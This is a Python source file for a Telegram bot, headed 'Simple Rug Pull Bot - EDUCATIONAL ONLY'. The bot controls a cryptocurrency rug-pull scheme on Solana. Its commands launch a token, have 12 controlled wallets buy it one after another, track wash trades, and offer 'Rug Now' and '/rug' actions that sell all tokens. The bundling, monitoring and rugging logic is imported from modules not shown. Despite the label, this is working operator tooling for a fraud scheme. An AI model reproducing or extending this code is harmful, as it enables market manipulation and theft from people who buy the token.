#!/usr/bin/env python3
"""
Simple Rug Pull Bot - EDUCATIONAL ONLY
"""

import asyncio
import sys
import os

try:
    import telebot
    from telebot import types
    from config import TELEGRAM_TOKEN, RPC_URL
    from modules.bundler import RugBundler
    from modules.monitor import HypeMonitor
    from modules.rugger import RugExecutor
except ImportError as e:
    print(f"\n[ERROR] Import Error: {e}")
    print("\n[INFO] Install dependencies:")
    print("   pip install -r requirements.txt")
    sys.exit(1)
except ValueError as e:
    print(f"\n[ERROR] Configuration Error: {e}")
    print("\n[INFO] Setup Instructions:")
    print("1. Copy env.example to .env")
    print("2. Edit .env and add your credentials")
    print("3. Run: python setup_rpc.py")
    sys.exit(1)

bot = telebot.TeleBot(TELEGRAM_TOKEN)
bundler = RugBundler(RPC_URL)
monitor = HypeMonitor(RPC_URL)
rugger = RugExecutor(RPC_URL)

# Store active token for quick actions
active_token = {}

@bot.message_handler(commands=['start'])
def handle_start(message):
    """Start command with buttons."""
    markup = types.InlineKeyboardMarkup()
    markup.row(
        types.InlineKeyboardButton("💰 Check Wallets", callback_data="wallets"),
        types.InlineKeyboardButton("📊 Status", callback_data="status")
    )
    
    welcome_text = (
        "🤖 Rug Bot Ready!\n\n"
        "📝 LAUNCH TOKEN:\n"
        "/launch <name> <symbol> <image>\n\n"
        "⚡ QUICK ACTIONS:\n"
        "Use buttons below for instant access!"
    )
    
    bot.reply_to(message, welcome_text, reply_markup=markup)

@bot.message_handler(commands=['launch'])
def handle_launch(message):
    """Launch token with validation and auto-monitoring."""
    try:
        args = message.text.split()[1:]
        if len(args) < 3:
            bot.reply_to(message, "Usage: /launch <name> <symbol> <image_url>")
            return
        
        name, symbol, image_url = args[0], args[1], args[2]
        
        # Input validation
        if len(name) > 32:
            bot.reply_to(message, "[ERROR] Token name too long (max 32 chars)")
            return
        if len(symbol) > 10:
            bot.reply_to(message, "[ERROR] Symbol too long (max 10 chars)")
            return
        if not image_url.startswith('http'):
            bot.reply_to(message, "[ERROR] Invalid image URL (must start with http)")
            return
        
        bot.reply_to(message, f"[LAUNCH] Creating {name} ({symbol})...")
        bot.reply_to(message, f"[INFO] 12 wallets will buy sequentially")
        
        mint = asyncio.run(bundler.create_and_bundle(name, symbol, image_url))
        
        if mint:
            # Store active token for this chat
            active_token[message.chat.id] = mint
            
            # Create action buttons
            markup = types.InlineKeyboardMarkup()
            markup.row(
                types.InlineKeyboardButton("👁 Monitor", callback_data=f"monitor_{mint}"),
                types.InlineKeyboardButton("💀 Rug Now", callback_data=f"rug_{mint}")
            )
            markup.row(
                types.InlineKeyboardButton("💰 Check Wallets", callback_data="wallets"),
                types.InlineKeyboardButton("📊 Status", callback_data="status")
            )
            
            success_text = (
                f"✅ TOKEN CREATED!\n\n"
                f"📍 Mint: {mint}\n\n"
                f"🤖 Auto-monitoring: ENABLED\n"
                f"⚡ Quick actions below:"
            )
            
            bot.reply_to(message, success_text, reply_markup=markup)
            
            # Auto-start monitoring (essential, not optional)
            try:
                asyncio.run(monitor.start(mint, message.chat.id))
            except Exception as monitor_error:
                bot.reply_to(message, f"[WARNING] Monitor failed: {monitor_error}")
        else:
            bot.reply_to(message, f"[ERROR] Launch failed")
            
    except ValueError as ve:
        bot.reply_to(message, f"[ERROR] Validation failed: {ve}")
    except Exception as e:
        bot.reply_to(message, f"[ERROR] Launch failed: {e}")
        import traceback
        print(f"[ERROR] Full trace: {traceback.format_exc()}")

@bot.message_handler(commands=['monitor'])
def handle_monitor(message):
    """Start monitoring."""
    try:
        args = message.text.split()[1:]
        if len(args) < 1:
            bot.reply_to(message, "Usage: /monitor <mint>")
            return
            
        mint = args[0]
        bot.reply_to(message, f"[MONITOR] Started monitoring {mint}")
        
    except Exception as e:
        bot.reply_to(message, f"Monitor failed: {e}")

@bot.message_handler(commands=['rug'])
def handle_rug(message):
    """Manual rug."""
    try:
        args = message.text.split()[1:]
        if len(args) < 1:
            bot.reply_to(message, "Usage: /rug <mint>")
            return
            
        mint = args[0]
        success = asyncio.run(rugger.execute(mint))
        
        if success:
            bot.reply_to(message, f"[RUG] RUGGED {mint}")
        else:
            bot.reply_to(message, f"[ERROR] Rug failed for {mint}")
            
    except Exception as e:
        bot.reply_to(message, f"Rug failed: {e}")

@bot.message_handler(commands=['status'])
def handle_status(message):
    """Get bot status."""
    try:
        status = monitor.get_status()
        bot.reply_to(message, f"Bot Status:\nActive tokens: {len(status['active_tokens'])}\nWash trades: {status['wash_count']}")
    except Exception as e:
        bot.reply_to(message, f"Status check failed: {e}")

@bot.message_handler(commands=['wallets'])
def handle_wallets(message):
    """Check wallet funding status."""
    try:
        from solana.rpc.api import Client
        from modules.utils import load_wallets
        import os
        import json
        
        # Import Pubkey
        try:
            from solders.pubkey import Pubkey
        except ImportError:
            from solana.publickey import PublicKey as Pubkey
        
        bot.reply_to(message, "[INFO] Checking wallet funding status...")
        
        # Load wallets
        wallets = load_wallets()
        if not wallets:
            bot.reply_to(message, "[ERROR] No wallets found! Bot will generate them on first launch.")
            return
        
        # Connect to RPC
        client = Client(RPC_URL)
        
        # Check balances
        funded_count = 0
        unfunded_count = 0
        total_balance = 0.0
        
        response_lines = ["WALLET FUNDING STATUS\n" + "="*40 + "\n"]
        
        for i, wallet in enumerate(wallets):
            try:
                # Get wallet address
                try:
                    wallet_addr = str(wallet.pubkey())
                except:
                    wallet_addr = str(wallet.public_key)
                
                # Convert string to Pubkey object
                pubkey_obj = Pubkey.from_string(wallet_addr)
                
                # Get balance
                balance_resp = client.get_balance(pubkey_obj)
                balance_sol = balance_resp.value / 1e9 if balance_resp.value else 0.0
                total_balance += balance_sol
                
                # Determine status
                if balance_sol >= 0.003:
                    status = "FUNDED"
                    funded_count += 1
                    emoji = "[OK]"
                elif balance_sol > 0:
                    status = "LOW"
                    unfunded_count += 1
                    emoji = "[LOW]"
                else:
                    status = "EMPTY"
                    unfunded_count += 1
                    emoji = "[EMPTY]"
                
                # Add to response
                response_lines.append(f"{emoji} Wallet {i}: {balance_sol:.4f} SOL")
                response_lines.append(f"   {wallet_addr}")
                response_lines.append(f"   Status: {status}\n")
                
            except Exception as e:
                response_lines.append(f"[ERROR] Wallet {i}: {str(e)[:30]}\n")
        
        # Summary
        response_lines.append("="*40)
        response_lines.append(f"\nSUMMARY:")
        response_lines.append(f"  Total wallets: {len(wallets)}")
        response_lines.append(f"  Funded: {funded_count}")
        response_lines.append(f"  Need funding: {unfunded_count}")
        response_lines.append(f"  Total balance: {total_balance:.4f} SOL")
        
        if unfunded_count > 0:
            needed_sol = unfunded_count * 0.003
            response_lines.append(f"\n[ACTION] FUNDING REQUIRED:")
            response_lines.append(f"  Fund {unfunded_count} wallets")
            response_lines.append(f"  Need: {needed_sol:.4f} SOL total")
            response_lines.append(f"  (0.003 SOL per wallet)")
        else:
            response_lines.append(f"\n[OK] All wallets funded!")
        
        # Send response (split if too long)
        response = "\n".join(response_lines)
        if len(response) > 4000:
            # Split into chunks
            chunks = [response[i:i+4000] for i in range(0, len(response), 4000)]
            for chunk in chunks:
                bot.reply_to(message, chunk)
        else:
            bot.reply_to(message, response)
            
    except Exception as e:
        bot.reply_to(message, f"[ERROR] Wallet check failed: {e}")
        import traceback
        print(f"[ERROR] Wallet check trace: {traceback.format_exc()}")

# Callback query handlers for buttons
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    """Handle all button callbacks."""
    try:
        data = call.data
        chat_id = call.message.chat.id
        
        # Wallets button
        if data == "wallets":
            bot.answer_callback_query(call.id, "Checking wallets...")
            handle_wallets_check(chat_id)
        
        # Status button
        elif data == "status":
            bot.answer_callback_query(call.id, "Getting status...")
            handle_status_check(chat_id)
        
        # Monitor button
        elif data.startswith("monitor_"):
            mint = data.replace("monitor_", "")
            bot.answer_callback_query(call.id, f"Monitoring {mint[:8]}...")
            bot.send_message(chat_id, f"[MONITOR] Monitoring active for {mint}")
        
        # Rug button
        elif data.startswith("rug_"):
            mint = data.replace("rug_", "")
            bot.answer_callback_query(call.id, "⚠️ Executing rug...")
            
            # Confirmation markup
            confirm_markup = types.InlineKeyboardMarkup()
            confirm_markup.row(
                types.InlineKeyboardButton("✅ CONFIRM RUG", callback_data=f"rug_confirm_{mint}"),
                types.InlineKeyboardButton("❌ Cancel", callback_data="cancel")
            )
            
            bot.send_message(
                chat_id,
                f"⚠️ CONFIRM RUG PULL?\n\nMint: {mint[:16]}...\n\nThis will sell all tokens!",
                reply_markup=confirm_markup
            )
        
        # Rug confirmation
        elif data.startswith("rug_confirm_"):
            mint = data.replace("rug_confirm_", "")
            bot.answer_callback_query(call.id, "💀 Rugging...")
            bot.send_message(chat_id, f"[RUG] Executing for {mint}...")
            
            success = asyncio.run(rugger.execute(mint))
            
            if success:
                bot.send_message(chat_id, f"✅ [RUG] SUCCESSFULLY RUGGED {mint}")
            else:
                bot.send_message(chat_id, f"❌ [ERROR] Rug failed for {mint}")
        
        # Cancel button
        elif data == "cancel":
            bot.answer_callback_query(call.id, "Cancelled")
            bot.edit_message_text("❌ Action cancelled", chat_id, call.message.message_id)
            
    except Exception as e:
        bot.answer_callback_query(call.id, f"Error: {str(e)[:50]}")
        print(f"[ERROR] Callback error: {e}")

def handle_wallets_check(chat_id):
    """Handle wallets check from button."""
    try:
        from solana.rpc.api import Client
        from modules.utils import load_wallets
        
        # Import Pubkey
        try:
            from solders.pubkey import Pubkey
        except ImportError:
            from solana.publickey import PublicKey as Pubkey
        
        bot.send_message(chat_id, "[INFO] Checking wallet funding status...")
        
        # Load wallets
        wallets = load_wallets()
        if not wallets:
            bot.send_message(chat_id, "[ERROR] No wallets found! Bot will generate them on first launch.")
            return
        
        # Connect to RPC
        client = Client(RPC_URL)
        
        # Check balances
        funded_count = 0
        unfunded_count = 0
        total_balance = 0.0
        
        response_lines = ["💰 WALLET FUNDING STATUS\n" + "="*40 + "\n"]
        
        for i, wallet in enumerate(wallets):
            try:
                # Get wallet address
                try:
                    wallet_addr = str(wallet.pubkey())
                except:
                    wallet_addr = str(wallet.public_key)
                
                # Convert string to Pubkey object
                pubkey_obj = Pubkey.from_string(wallet_addr)
                
                # Get balance
                balance_resp = client.get_balance(pubkey_obj)
                balance_sol = balance_resp.value / 1e9 if balance_resp.value else 0.0
                total_balance += balance_sol
                
                # Determine status
                if balance_sol >= 0.003:
                    status = "FUNDED"
                    funded_count += 1
                    emoji = "✅"
                elif balance_sol > 0:
                    status = "LOW"
                    unfunded_count += 1
                    emoji = "⚠️"
                else:
                    status = "EMPTY"
                    unfunded_count += 1
                    emoji = "❌"
                
                # Add to response
                response_lines.append(f"{emoji} Wallet {i}: {balance_sol:.4f} SOL")
                response_lines.append(f"   {wallet_addr}")
                response_lines.append(f"   Status: {status}\n")
                
            except Exception as e:
                response_lines.append(f"[ERROR] Wallet {i}: {str(e)[:30]}\n")
        
        # Summary
        response_lines.append("="*40)
        response_lines.append(f"\n📊 SUMMARY:")
        response_lines.append(f"  Total wallets: {len(wallets)}")
        response_lines.append(f"  Funded: {funded_count}")
        response_lines.append(f"  Need funding: {unfunded_count}")
        response_lines.append(f"  Total balance: {total_balance:.4f} SOL")
        
        if unfunded_count > 0:
            needed_sol = unfunded_count * 0.003
            response_lines.append(f"\n⚠️ ACTION REQUIRED:")
            response_lines.append(f"  Fund {unfunded_count} wallets")
            response_lines.append(f"  Need: {needed_sol:.4f} SOL total")
            response_lines.append(f"  (0.003 SOL per wallet)")
        else:
            response_lines.append(f"\n✅ All wallets funded!")
        
        # Send response (split if too long)
        response = "\n".join(response_lines)
        if len(response) > 4000:
            # Split into chunks
            chunks = [response[i:i+4000] for i in range(0, len(response), 4000)]
            for chunk in chunks:
                bot.send_message(chat_id, chunk)
        else:
            bot.send_message(chat_id, response)
            
    except Exception as e:
        bot.send_message(chat_id, f"[ERROR] Wallet check failed: {e}")
        import traceback
        print(f"[ERROR] Wallet check trace: {traceback.format_exc()}")

def handle_status_check(chat_id):
    """Handle status check from button."""
    try:
        status = monitor.get_status()
        status_text = (
            f"🤖 BOT STATUS\n\n"
            f"📊 Active tokens: {len(status['active_tokens'])}\n"
            f"🔄 Wash trades: {status['wash_count']}"
        )
        bot.send_message(chat_id, status_text)
    except Exception as e:
        bot.send_message(chat_id, f"[ERROR] Status check failed: {e}")

if __name__ == "__main__":
    print("Simple Rug Bot Starting...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Bot failed: {e}")
